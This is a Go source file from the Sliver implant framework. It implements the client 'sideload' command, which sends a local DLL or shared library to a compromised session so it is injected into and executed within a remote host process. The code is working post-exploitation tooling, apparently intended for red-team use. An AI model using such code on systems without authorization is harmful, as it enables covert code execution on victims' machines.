package execute

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"strings"

	"github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// Sideload - Load and execute a shared object (shared library/DLL) in a remote process
type Sideload struct {
	Positional struct {
		LocalPath string   `description:"path to shared object" required:"1-1"`
		Args      []string `description:"(optional) arguments for the shared library function"`
	} `positional-args:"yes" required:"yes"`

	Options struct {
		Entrypoint string `long:"entry-point" short:"e" description:"entrypoint for the DLL (Windows only)"`
		RemotePath string `long:"process" short:"p" description:"path to process to host the shellcode"`
		Save       bool   `long:"save" short:"s" description:"save output to file"`
		KeepAlive  bool   `long:"keep-alive" short:"k" description:"don't terminate host process once the execution completes"`
	} `group:"sideload options"`
}

// Execute - Load and execute a shared object (shared library/DLL) in a remote process
func (s *Sideload) Execute(args []string) (err error) {
	session := core.ActiveTarget.Session

	binPath := s.Positional.LocalPath

	entryPoint := s.Options.Entrypoint
	processName := s.Options.RemotePath
	cargs := strings.Join(s.Positional.Args, " ")

	binData, err := ioutil.ReadFile(binPath)
	if err != nil {
		log.Errorf("%s", err.Error())
		return
	}
	ctrl := make(chan bool)
	go log.SpinUntil(fmt.Sprintf("Sideloading %s ...", binPath), ctrl)
	sideload, err := transport.RPC.Sideload(context.Background(), &sliverpb.SideloadReq{
		Args:        cargs,
		Data:        binData,
		EntryPoint:  entryPoint,
		ProcessName: processName,
		Kill:        !s.Options.KeepAlive,
		Request:     core.ActiveTarget.Request(),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		log.Errorf("Error: %v", err)
		return
	}

	if sideload.GetResponse().GetErr() != "" {
		log.Errorf("Error: %s\n", sideload.GetResponse().GetErr())
		return
	}
	var outFilePath *os.File
	if s.Options.Save {
		outFile := path.Base(fmt.Sprintf("%s_%s*.log", constants.SideloadStr, session.GetHostname()))
		outFilePath, err = ioutil.TempFile("", outFile)
	}
	log.Infof("Output:\n%s", sideload.GetResult())
	if outFilePath != nil {
		outFilePath.Write([]byte(sideload.GetResult()))
		log.Infof("Output saved to %s\n", outFilePath.Name())
	}

	return
}
